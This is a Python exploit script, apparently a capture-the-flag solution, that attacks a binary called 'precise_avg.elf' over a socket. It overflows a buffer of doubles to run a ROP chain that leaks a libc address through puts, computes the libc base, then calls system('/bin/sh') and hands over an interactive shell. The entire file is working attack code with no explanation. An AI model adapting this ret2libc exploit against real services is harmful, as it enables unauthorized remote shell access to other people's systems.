#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './precise_avg.elf'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'target', 'port':4296})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.19.so_remote')
env.select()

#==========

binf = ELF(bin_file)
addr_got_main       = binf.got['__libc_start_main']
addr_plt_puts       = binf.plt['puts']
addr_main           = 0x4007d0

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_main        = libc.sep_function['__libc_start_main']

#==========

double = lambda x : '%.330f' % struct.unpack("d",p64(x))[0]

def attack(conn, **kwargs):
    rop = ROP(binf)

    exploits  = [0xcafebabe]
    exploits += [rop.rdi.address]
    exploits += [addr_got_main]
    exploits += [addr_plt_puts]
    exploits += [addr_main]

    conn.sendlineafter('values: ', str(0x22+len(exploits)))
    for _ in range(0x22):
        sleep(0.05)
        conn.sendline('.')

    for x in exploits:
        sleep(0.05)
        conn.sendline(double(x))

    conn.recvuntil('0\n')
    addr_libc_main = u(conn.recvuntil('\n+', drop=True))
    libc.address = addr_libc_main - offset_libc_main
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search('/bin/sh'))

    exploits  = [0xcafebabe]
    exploits += [rop.ret.address]
    exploits += [rop.rdi.address]
    exploits += [addr_libc_str_sh]
    exploits += [addr_libc_system]

    conn.sendlineafter('values: ', str(0x22+len(exploits)))
    for _ in range(0x22):
        sleep(0.05)
        conn.sendline('.')

    for x in exploits:
        sleep(0.05)
        conn.sendline(double(x))

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()
    
#==========
